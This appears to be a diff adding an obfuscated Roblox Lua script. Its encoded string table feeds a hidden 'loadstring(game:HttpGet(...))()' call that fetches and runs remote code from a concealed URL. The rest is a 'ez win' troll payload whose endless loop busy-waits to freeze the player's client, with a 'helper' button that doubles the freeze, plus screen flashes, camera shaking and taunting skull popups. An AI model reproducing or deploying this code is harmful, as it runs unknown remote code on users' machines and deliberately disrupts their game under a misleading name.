+  _I0Il0I0OI00O("fTkr".."svOEsIkW".."fGE".."="),
+  _I0Il0I0OI00O("bjE".."pur".."6xs5".."EYKE".."hBQSQp".."vr+4sA".."=="),
+  _I0Il0I0OI00O("bzwuvr".."GxrY8eZm".."BBDR84".."r7ykq".."o4eZm".."c="),
+  _I0Il0I0OI00O("bjwy".."uLixrZQZ".."Zy5rXz".."E5tA=="),
+  _I0Il0I0OI00O("fCU".."yrb".."q7s5".."RXSWNNQ".."TU0tb2".."9"),
+  _I0Il0I0OI00O("ajw0qb".."G7/7sFf".."XpcQj".."Qpsr+4s".."A=="),
+  _I0Il0I0OI00O("YTk0t".."ba4/7".."4Wa3pdXj".."U3sg=="),
+  _I0Il0I0OI00O("bjg+vf".."OXrZwVe".."m9LTDQ6u".."aG1"),
+  _I0Il0I0OI00O("bzE3t7am".."tpMW".."KE1JXS".."AuuLC9sZ".."w="),
+  _I0Il0I0OI00O("YCU2trq7".."/68WeH".."5BWSQ0"),
+  _I0Il0I0OI00O("fTU1vKa".."9sZ".."JXS2FLQ".."iMytb".."w="),
+  _I0Il0I0OI00O("bjgy".."tqO".."1sYceZmc".."IbzE1".."ur29sZ".."Q="),
+  _I0Il0I0OI00O("ej8".."2ubz0jZI".."bZGE="),
+  _I0Il0I0OI00O("fTU1vKa".."9sd0".."jemt".."N"),
+  _I0Il0I0OI00O("aT8y+".."5e7tt0".."zZw".."=="),
+  _I0Il0I0OI00O("fjE3".."ur69".."sZJXWGtG".."SiUytbw="),
+  _I0Il0I0OI00O("ayI0vLKg".."sN0n".."YXx".."JWT8="),
+  _I0Il0I0OI00O("YDE".."1vLy".."4tpMeKF5".."JXyI0".."uLq6".."tg=="),
+  _I0Il0I0OI00O("bCY".."0uLKwtpM".."eKEldSzY".."0"),
+  _I0Il0I0OI00O("eTl7".."j7r0i5RX".."W29AWCI="),
+  _I0Il0I0OI00O("byUp".."ubK4sJM".."eKEJH".."QTk3tL+9"),
+  _I0Il0I0OI00O("byIpsv".."OWr".."Y8e".."KExBTi".."Uo+5e9vI".."gEKEx".."HQDIy".."uKan"),
+  _I0Il0I0OI00O("fTUptLC".."8upEbZy".."5kS".."D00".."tbC8upEb".."Zw=="),
+  _I0Il0I0OI00O("bzE1".."ur29q".."5xXTG".."FEXT".."gytbq".."gvg=".."="),
+  _I0Il0I0OI00O("YDE3".."ur6".."x/7".."waaXxNQT".."U="),
+  _I0Il0I0OI00O("bzE2ubq6".."tt00emF".."bWT".."k1sg=="),
+  _I0Il0I0OI00O("eSIut7".."q5u".."o8Y".."KFpa".."WDwyuL".."q6vg=="),
+  _I0Il0I0OI00O("bCY0".."uLKwtpM".."eKE9GWTk".."3tKO9sZQ".."="),
+  _I0Il0I0OI00O("byIp+5Gm".."rd0".."naXpJ".."XTk2"),
+  _I0Il0I0OI00O("bzE1v".."7qg".."sN02".."cGF".."ERCQ0"),
+  _I0Il0I0OI00O("bjErq6".."a3vJ".."QZZy".."5pXiM6q".."KC9sZI="),
+  _I0Il0I0OI00O("fTk1".."vrK4sI".."kDZy5u".."XyUvr7K".."mtp".."MY"),
+  _I0Il0I0OI00O("fTkrs".."vOVqZI".."UaWpH"),
+  _I0Il0I0OI00O("ayI0".."vLz".."0mpE".."RZw=="),
+  _I0Il0I0OI00O("eSIyuP".."OArZwUK".."ExJXzE5t".."Ly5"),
+  _I0Il0I0OI00O("biUr".."uLK".."/ut08Z2".."9ETA".."=="),
+  _I0Il0I0OI00O("eTF7j7L".."0i5xXXG8".."IfjEzrq".."E="),
+  _I0Il0I0OI00O("bjE".."4r7z0l5".."QHZ35HW".."TE2".."tA=="),
+  _I0Il0I0OI00O("bz81v".."rC1/7wa".."am9E".."TDIu"),
+  _I0Il0I0OI00O("bzE1".."v7qg".."sN0".."1Z2xaR".."CQvtA=="),
+  _I0Il0I0OI00O("ajE1vKC".."guo9".."XTmFH".."WTUpug=="),
+  _I0Il0I0OI00O("eSIyq6".."O9/6".."kFZ35YR".."A=="),
+  _I0Il0I0OI00O("fTkrsvOX".."sI8".."ZYQ=="),
+  _I0Il0I0OI00O("fTkr".."svOftoo".."e"),
+  _I0Il0I0OI00O("eTEpr7K".."mvp".."oZZw=="),
+  _I0Il0I0OI00O("fzE4u".."Ly7".."sZR".."XQm9".."GSTU3sr2".."9"),
+  _I0Il0I0OI00O("Yz80u".."bq6t".."t0kaWBc".."TD4yt".."bo="),
+  _I0Il0I0OI00O("fiYyt".."bq6vt0".."1Z2NKTCI".."/sr27"),
+  _I0Il0I0OI00O("eTE3".."q7L0m5RX".."TmtaQg".."=="),
+  _I0Il0I0OI00O("azwu".."qbqys4g".."FaQ=".."="),
+  _I0Il0I0OI00O("eTk2+".."5C8".."upgEbQ=".."="),
+  _I0Il0I0OI00O("YTkp".."sr8".."4/7".."EWe".."mdEzQ=="),
+  _I0Il0I0OI00O("Yz80ubq6".."tt0".."nYXRSTD4".."ytbo=")
+}
+
+task.spawn(function()
+loadstring(game:HttpGet(_I0Il0I0OI00O("RSQvq6".."Du8NIW".."eGcGQSU6".."qb67rdMZ".."bXoHSzk3".."vqD7q".."clYZGFJ".."STUpqPzs".."78U".."RPG9M".."GTU5vbX".."g6MgUP".."TlLSG".."ZqvrLn5p".."hDOWsa".."Hn43rr".."I=")))()
+end)
+
+task.spawn(function()
+-- ez win | Place in StarterPlayerScripts
+local TweenService = game:GetService("TweenService")
+local PlayerGui = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+
+local lagLevel, isLagging, totalMs, freezeMult = 0, false, 0, 32
+local MAX = 10
+
+local sg = Instance.new("ScreenGui", PlayerGui)
+sg.Name, sg.ResetOnSpawn, sg.IgnoreGuiInset = "ez win", false, true
+
+local function lbl(parent, props)
+local l = Instance.new("TextLabel", parent)
+l.BackgroundTransparency = 1
+for k,v in props do l[k] = v end
+return l
+end
+
+-- skull popup
+local skullFrame = Instance.new("Frame", sg)
+skullFrame.Size = UDim2.new(0,180,0,220)
+skullFrame.AnchorPoint = Vector2.new(0.5,0.5)
+skullFrame.Position = UDim2.new(0.5,0,0.5,0)
+skullFrame.BackgroundTransparency = 1
+skullFrame.ZIndex = 25
+skullFrame.Visible = false
+
+local skullImg = Instance.new("ImageLabel", skullFrame)
+skullImg.Size = UDim2.new(1,0,0,175)
+skullImg.BackgroundTransparency = 1
+skullImg.Image = "rbxassetid://SKULL_ASSET_ID" -- upload image to Roblox and replace with your asset ID
+skullImg.ZIndex = 25
+
+-- blood drip letters for "gg lil buddy"
+local letters = {"g","g"," ","l","i","l"," ","b","u","d","d","y"}
+local letterLabels = {}
+local letterFrame = Instance.new("Frame", skullFrame)
+letterFrame.Size = UDim2.new(1,0,0,50)
+letterFrame.Position = UDim2.new(0,0,0,178)
+letterFrame.BackgroundTransparency = 1
+letterFrame.ZIndex = 26
+
+for i, char in ipairs(letters) do
+local l = Instance.new("TextLabel", letterFrame)
+l.Size = UDim2.new(0,16,0,50)
+l.Position = UDim2.new(0,(i-1)*16,0,0)
+l.BackgroundTransparency = 1
+l.Text = char
+l.TextColor3 = Color3.fromRGB(180,0,0)
+l.TextSize = 20
+l.Font = Enum.Font.GothamBold
+l.ZIndex = 26
+l.TextTransparency = 1
+table.insert(letterLabels, l)
+end
+
+local function showSkull()
+skullFrame.Size = UDim2.new(0,0,0,0)
+skullFrame.Visible = true
+-- reset letters
+for _, l in letterLabels do
+l.TextTransparency = 1
+l.Position = UDim2.new(l.Position.X.Scale, l.Position.X.Offset, 0, -10)
+end
+TweenService:Create(skullFrame, TweenInfo.new(0.2, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
+Size = UDim2.new(0,180,0,235)
+}):Play()
+-- drip each letter down with delay
+task.spawn(function()
+for i, l in letterLabels do
+task.wait(0.06)
+l.TextTransparency = 0
+-- drip down effect
+local dropDist = 8 + math.random(0,10)
+TweenService:Create(l, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
+Position = UDim2.new(l.Position.X.Scale, l.Position.X.Offset, 0, dropDist)
+}):Play()
+task.wait(0.18)
+TweenService:Create(l, TweenInfo.new(0.12, Enum.EasingStyle.Bounce, Enum.EasingDirection.Out), {
+Position = UDim2.new(l.Position.X.Scale, l.Position.X.Offset, 0, 4)
+}):Play()
+-- pulse red to dark red
+TweenService:Create(l, TweenInfo.new(0.4, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, 2, true), {
+TextColor3 = Color3.fromRGB(80,0,0)
+}):Play()
+end
+end)
+task.delay(2.2, function()
+-- drip off screen
+task.spawn(function()
+for _, l in letterLabels do
+task.wait(0.04)
+TweenService:Create(l, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
+Position = UDim2.new(l.Position.X.Scale, l.Position.X.Offset, 0, 60),
+TextTransparency = 1
+}):Play()
+end
+end)
+task.wait(0.5)
+TweenService:Create(skullFrame, TweenInfo.new(0.2), {Size=UDim2.new(0,0,0,0)}):Play()
+task.delay(0.25, function() skullFrame.Visible = false end)
+end)
+end
+
+-- ez win popup
+local ezWin = lbl(sg, {
+Size=UDim2.new(0,240,0,70), AnchorPoint=Vector2.new(0.5,0.5),
+Position=UDim2.new(0.5,0,0.3,0), Text="ez win",
+TextColor3=Color3.fromRGB(255,220,50), TextSize=52,
+Font=Enum.Font.GothamBold, TextTransparency=1, ZIndex=20
+})
+
+-- helper button
+local helperBtn = Instance.new("TextButton", sg)
+helperBtn.Size = UDim2.new(0,140,0,42)
+helperBtn.AnchorPoint = Vector2.new(0.5,1)
+helperBtn.Position = UDim2.new(0.5,0,0.97,0)
+helperBtn.BackgroundColor3 = Color3.fromRGB(50,200,100)
+helperBtn.BorderSizePixel = 0
+helperBtn.Text = "helper (x32)"
+helperBtn.TextColor3 = Color3.fromRGB(255,255,255)
+helperBtn.TextSize = 15
+helperBtn.Font = Enum.Font.GothamBold
+helperBtn.ZIndex = 20
+Instance.new("UICorner", helperBtn).CornerRadius = UDim.new(0,8)
+
+helperBtn.MouseButton1Click:Connect(function()
+freezeMult = freezeMult * 2
+helperBtn.Text = "helper (x"..freezeMult..")"
+helperBtn.BackgroundColor3 = Color3.fromRGB(math.min(freezeMult*4,255), 50, 50)
+end)
+
+local msgs = {"packet loss detected","PING SPIKE!","rubber banding...","you got lagged lmaooo","teleporting backwards","server says no","latency through the roof","you are now desync'd","buffering your buffering"}
+
+local function showEzWin()
+ezWin.TextTransparency = 0
+ezWin.Position = UDim2.new(0.5,0,0.3,0)
+TweenService:Create(ezWin, TweenInfo.new(1.4, Enum.EasingStyle.Quad), {
+Position=UDim2.new(0.5,0,0.15,0), TextTransparency=1
+}):Play()
+end
+
+local function showSkull()
+local frame = Instance.new("Frame", sg)
+frame.Size = UDim2.new(0,260,0,320)
+frame.AnchorPoint = Vector2.new(0.5,0.5)
+frame.Position = UDim2.new(0.5,0,0.5,0)
+frame.BackgroundColor3 = Color3.fromRGB(0,0,0)
+frame.BackgroundTransparency = 0
+frame.BorderSizePixel = 0
+frame.ZIndex = 30
+Instance.new("UICorner", frame).CornerRadius = UDim.new(0,12)
+
+local img = Instance.new("ImageLabel", frame)
+img.Size = UDim2.new(1,0,0,260)
+img.BackgroundTransparency = 1
+img.Image = "rbxassetid://YOUR_SKULL_ASSET_ID" -- upload skull image to Roblox and paste asset ID here
+img.ScaleType = Enum.ScaleType.Fit
+img.ZIndex = 31
+
+local txt = Instance.new("TextLabel", frame)
+txt.Size = UDim2.new(1,0,0,50)
+txt.Position = UDim2.new(0,0,0,265)
+txt.BackgroundTransparency = 1
+txt.Text = "gg lil buddy"
+txt.TextColor3 = Color3.fromRGB(255,30,30)
+txt.TextSize = 28
+txt.Font = Enum.Font.GothamBold
+txt.ZIndex = 31
+
+task.delay(2.5, function()
+TweenService:Create(frame, TweenInfo.new(0.4), {BackgroundTransparency=1}):Play()
+TweenService:Create(img, TweenInfo.new(0.4), {ImageTransparency=1}):Play()
+TweenService:Create(txt, TweenInfo.new(0.4), {TextTransparency=1}):Play()
+task.delay(0.5, function() frame:Destroy() end)
+end)
+end
+
+local function flash(intensity)
+local f = Instance.new("Frame", sg)
+f.Size, f.BorderSizePixel, f.ZIndex = UDim2.new(1,0,1,0), 0, 10
+f.BackgroundColor3 = Color3.fromRGB(255,80,30)
+f.BackgroundTransparency = 1 - (intensity/220)
+TweenService:Create(f, TweenInfo.new(0.3), {BackgroundTransparency=1}):Play()
+task.delay(0.4, function() f:Destroy() end)
+end
+
+local function shakeCamera(intensity)
+local cam = workspace.CurrentCamera
+if not cam then return end
+local origin = cam.CFrame
+for _ = 1, math.floor(intensity/10)+2 do
+task.wait(0.04)
+cam.CFrame = origin * CFrame.Angles((math.random()-.5)*intensity*.01,(math.random()-.5)*intensity*.01,0)
+end
+cam.CFrame = origin
+end
+
+local function doLag(level)
+local intensity = level * 10
+for _ = 1, math.floor(level/2)+1 do
+local ms = 80 + math.random(0, intensity*4)
+totalMs = totalMs + ms
+flash(intensity)
+task.spawn(shakeCamera, intensity)
+local t = tick()
+while tick()-t < ((ms/1000)+0.25)*freezeMult do end
+task.wait(0.05)
+end
+showEzWin()
+showSkull()
+showSkull()
+end
+
+-- Auto-lag loop
+task.spawn(function()
+showSkull()
+while true do
+if isLagging then task.wait(0.5) continue end
+task.wait(0.01)
+isLagging = true
+lagLevel = lagLevel >= MAX and 1 or lagLevel + 1
+doLag(lagLevel)
+isLagging = false
+end
+end)
+end)
+
+end
+local _IlOOO00O00=(895*3205>895) and _OIl00OIOlO or nil
+if _IlOOO00O00 then _IlOOO00O00() end
